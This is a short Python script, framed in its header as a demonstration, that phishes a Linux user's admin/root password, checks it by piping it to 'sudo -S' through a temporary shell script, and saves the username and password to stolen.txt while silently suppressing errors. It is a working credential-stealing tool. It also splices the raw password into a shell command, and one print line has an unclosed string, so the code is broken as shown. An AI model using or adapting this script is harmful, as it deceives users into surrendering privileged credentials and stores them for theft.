'''
/****
   A simple Python Program which demonstrates the malicious capability of python programs to convince
   Linux users to give admin password through social engineering. The password is verified using sudo
   and stored in stolen.txt  
***/
'''

import os
import platform
import getpass

#This Function returns currently logged in user and admin password.
def run():
 if platform.system().lower()=='linux':
  while True:
    user=getpass.getuser()
    print('\nYou are currently Logged in as '+user)
    x=input('\nEnter Admin/root password:')
    with open('shell.sh','w') as f:
      f.write('echo '+x+' | sudo -S clear \nexit')
    os.system('chmod +x shell.sh')
    y=os.system('./shell.sh 2>/dev/null')
    z=os.system('clear')
    if y==0:      
      os.remove('shell.sh')
      return (user,x)
      break
    else:
      print('\nIncorrect Password!!!\n)
      os.remove('shell.sh')
      ch=input('Press any key to continue...\n')
      os.system('clear')    
      
def exe():
  try:
    x,y=run()
    # Storing Password in format current user , admin password .
    with open('stolen.txt','w') as f:
      f.write(x+':'+y)
  except:
    pass

if __name__=='__main__':
  exe()
